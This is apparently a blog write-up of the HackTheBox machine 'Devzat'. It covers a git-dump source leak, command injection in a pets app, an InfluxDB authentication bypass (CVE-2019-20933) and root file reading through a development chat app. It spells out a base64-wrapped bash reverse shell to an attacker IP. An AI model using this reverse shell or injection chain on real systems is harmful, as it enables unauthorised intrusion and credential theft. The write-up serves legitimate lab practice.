    <p>%title Devzat %template post %date 2022-07-26</p>
    <h2 id="introduction">Introduction</h2>
    <p>Devzat is a box on HackTheBox that involves heavily exploiting a user created chat app. The chat app does not seem to be usable for initial exploitation. However, after initial access, the app becomes a great source of system enumeration from the chat logs, as well as being able to be used to privesc to root. The initial access is gained from a subdomain hosting an incomplete CRUD app for managing an inventory of pets that has the .git directory publicly available. With access to the git folder, we can get the source for the web app and discover a command injection vulnerability that can be exploited with Burpsuite. Initial access as Patrick allows us to read his chat logs, revealing an Influxdb instance is running that is vulnerable to an authentication bypass. The database contains credentials for another user, Catherine, who we are then able to login as. Catherine's chat log reveals there is a development version of the chat app running on port 8443, and there is a backup file on the system. Analysis of the backed up files shows we can use app on port 8443 to read files as root. We can then read roots ssh key to login as root.</p>
    <h2 id="enumeration">Enumeration</h2>
    <h3 id="nmap">Nmap</h3>
    <p>From the nmap results, we can see that this is a webserver with an unidentified app on port 8000. Based on the scan on port 8000, it seems to be using a go library called <a href="https://github.com/karfield/ssh2go" title="wikilink">ssh2go</a></p>
    <p></p>
    <h3 id="website___httpdevzat.htb">Website - <a href="http://devzat.htb" title="wikilink">http://devzat.htb</a></h3>
    <p>Initial scanning shows the box has a website up. Trying to navigate to the website redirects us to <a href="http://devzat.htb" title="wikilink">http://devzat.htb</a>. After updating our /etc/hosts, we are able to see the webpage.</p>
    <p></p>
    <p>Not much about the site itself is interesting. However, there is a message at the bottom informing the reader that they are invited to try out their chat app.</p>
    <p>When running the instructed command, you may receive an error about no matching host key type. This error can be resolved by adding a few lines to ~/.ssh/config</p>
    <p></p>
    <p>Then we can run the command to gain access to the chat app</p>
    <h3 id="chat_app_first_look">Chat App First Look</h3>
    <p>With just the basic level of access we have, there is not much that can be done with the app right now. We will come back to this at a later point</p>
    <h3 id="subdomin___httppets.devzat.htb">Subdomin - <a href="http://pets.devzat.htb" title="wikilink">http://pets.devzat.htb</a></h3>
    <p>Taking a look back at port 80, since we needed to add an entry to /etc/hosts, it may be worthwhile to scan for subdomains. We will scan for subdomains using Gobuster.</p>
    <p>Our scan finds one valid subdomain at <a href="http://pets.devzat.htb" title="wikilink">http://pets.devzat.htb</a> The homepage is an incomplete CRUD app.</p>
    <p>The most that can be done is adding a pet to the pet inventory, but its not hooked up to a database so nothing saves. Running Gobuster to find other endpoints shows that <a href="http://pets.devzat.htb/.git/" title="wikilink">http://pets.devzat.htb/.git/</a> is publicly readable. We can grab the contents of the folder with <a href="https://pypi.org/project/git-dumper/" title="wikilink">git-dumper</a>.</p>
    <p></p>
    <p>This is probably the source code for the pets web application. Inside of main.go, there is code that takes our input without sanitizing it and passes it to `exec.Command`. This means we can inject our own commands into this command and gain remote code execution</p>
    <h2 id="shell_as_patrick">Shell as Patrick</h2>
    <p>To test if we can properly execute code, we will just see if we can get the contents of /etc/passwd</p>
    <p>Now that we now we can actually exploit this, we can execute a callback to a netcat listener.</p>
    <p>We base64 encrypt the command `bash -i &gt;&amp; /dev/tcp/10.10.14.7/4444 0&gt;&amp;1` and then decrypt and execute it in a one liner. This is done to avoid messing up the payload with special characters like `"` or `'`.</p>
    <p>From there, we can grab Patrick's ssh key for a better shell experience</p>
    <h2 id="shell_as_catherine">Shell as Catherine</h2>
    <h3 id="interesting_ports">Interesting ports</h3>
    <p>After running linpeas, we can see that there are some ports that are open locally that we could not previously access</p>
    <p>Right now, we do not know what these ports do, so we will look around some more.</p>
    <h3 id="patrick_chat_log">Patrick Chat Log</h3>
    <p>We can see Patrick's chat log in the chat app by logging into it while logged into the machine as Patrick</p>
    <p>Looking up info on Influxdb shows that it runs on port 8086 by default, and is thus likely what we saw earlier in linpeas. We can check the version of Influxdb running by making a HEAD request with curl on port 8086</p>
    <p>Looking up "Influxdb 1.7.5" on google shows results for <a href="https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933" title="wikilink">CVE-2019-20933</a>.</p>
    <p>With this exploit, we can bypass authentication and gain access to the database as an admin. We need to port forward with ssh in order to access the database on our machine.</p>
    <p>`ssh -L 8086:127.0.0.1:8086 patrick@10.10.11.118 -i patrick_id_rsa`.</p>
    <p>From there, we can dump the data from the users table</p>
    <p>This reveals a few users and their passwords, but Catherine sticks out because that is a user on the box. Attempting to use this password to switch users to Catherine is successful</p>
    <h2 id="shell_as_root">Shell as root</h2>
    <p>Now that we are Catherine, lets examine her chat log like we did for Patrick.</p>
    <p>The chat log mentions the development version of the chat app is up on port 8443, and the source code is in a backup file. Checking in /var/backup we find archives of the development and main version.</p>
    <p>Extracting and checking the this version of the code shows a new command `file` has been added that allows reading files on the system. A password is required, but it is hardcoded into the app, so we can just read it. Since this program is running as root, we can read roots ssh key</p>
    <p>Then we can just ssh as root</p>
